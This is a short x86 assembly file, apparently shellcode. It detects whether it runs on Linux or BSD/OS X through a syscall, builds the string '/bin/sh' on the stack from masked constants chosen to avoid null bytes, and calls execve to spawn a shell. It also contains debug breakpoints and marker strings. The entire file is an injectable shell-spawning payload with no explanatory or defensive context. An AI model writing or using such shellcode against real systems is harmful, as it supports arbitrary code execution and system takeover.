global _main
	
section .text
	
_main:
	xor eax, eax
	xor eax, 78
	mov ebx, eax 		; linux args
	mov ecx, eax
	push eax		; bsd args
	push eax
	push eax
	sub esp, 4
	int 0x80
	xor ecx, ecx
	cmp eax, ecx
	jg osx
	jmp linux
	db 0x41
	jecxz nope
	jmp go
next:
	pop eax
	mov ebp, eax
	push 0x1068732f
	push 0x6e69622f
	and byte [esp+7], 0x01
	mov edx, esp
	xor eax, eax
	
	mov ebp, esp
	sub esp, 12
	push eax
	push edx
	mov ebx, esp

	push eax
	push ebx
	push edx
	sub esp, 4
	
	mov ax, 0x11a
	xor ax, 0x121
	int 0x80
	add esp, 12

	xor eax, eax
	mov word [esp], 0x123
	sub word [esp], 0x123
	int 3
	mov ax, 0x123
	sub ax, 0x122
	sub esp, 4
	int 0x80
	add sp, 0x111
	sub sp, 0x101
go:
	call next
nope:
	nop
osx:
	int 3
	db "os x is here"
linux:
	int 3
	db "linux is here"